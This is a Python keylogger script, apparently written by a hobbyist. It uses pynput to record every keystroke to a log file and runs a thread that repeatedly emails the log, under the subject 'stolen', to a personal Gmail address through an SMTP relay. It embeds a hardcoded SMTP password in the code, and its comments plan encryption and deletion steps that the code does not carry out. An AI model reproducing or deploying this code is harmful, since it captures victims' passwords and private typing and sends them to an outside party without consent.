
# a program to record keys and then send them to an email account
# steps include - recording keys, save the recorded keys to a file in a folder,
#               -check if there is internet connection, if ther is go to next step else wait till internet is connected
#               -the internet is checked in intervals of 35 seconds
#               - copy the file to a different folder then encrypt the file then send it to an email account
#               - delete the file after every one minute 
# ........theef.................

# making the key logger

# import mailme
from unittest.mock import Mock
import smtplib
from email.mime.text import MIMEText
import threading
from threading import Thread, Lock
import time
import pynput

from pynput.keyboard import Key, Listener
# from mailme import mail
# mutex = Lock()
keys = []

# making a function for collecting keys after pressing

def on_press(Key):
    keys.append(Key)
    # after recording the keys, let us now call a function that writes to the log files

    write_file(keys)
    try:
        print('{0} key pressed'.format(Key.char))
    except AttributeError:
        print('{0} key pressed'.format(Key))

# now making the code that we will use to  write to a file 
def write_file(keys):
    with open('log_file.txt', 'w') as f:
        for Key in keys:
            K = str(Key).replace("'"," ")

            f.write(K)
            # adding space after every key
            f.write(" ")
def on_release(Key) :
    print('{0} key released'.format(Key))
    # if escape is pressed we exit
    try:
        if Key == Key.esc:

           return False
    except :
        pass
def typed():
    global typed
    typed = ('{0}'.format(Key))
    return typed
def logs():
    with open ("log_file.txt", "r") as textfile:
        content = textfile.readlines()
        email_body = "".join(content)
        
        textfile.close()
        return (email_body)

def mail() :
        while True: 
            # with mutex:   
                port = 587
                smtp_server = "live.smtp.mailtrap.io"
                login = "api"
                password = "8c5654d2c1171892760a13b5c381e388"

                sender_email = "malik@demomailtrap.com"
                reciever_email="malikmumali@gmail.com"

                # content
                text = logs()

                # mimetext object
                message = MIMEText(text, "plain")
                if message :
                    message["subject"] = "stolen"
                message["from"] = sender_email
                message["TO"] = reciever_email

                # send the mail

                with smtplib.SMTP(smtp_server, port) as server:
                    server.starttls() # secure the connection
                    server.login(login, password)
                    server.sendmail(sender_email, reciever_email, message.as_string())
                time.sleep(15000)
                # t = threading.Thread(target = mail)
                # t.start()


def complete() :  
    while True:
        # with mutex:
            with Listener( on_press=on_press, on_release = on_release) as listener:
                listener.join()
            # if __name__ == "__main__":


        
if __name__ == "__main__":
    t1 = Thread(target = mail)
    t2 = Thread(target = complete)
    t2.start()
    t1.start()
    t1.join()
    t2.join()

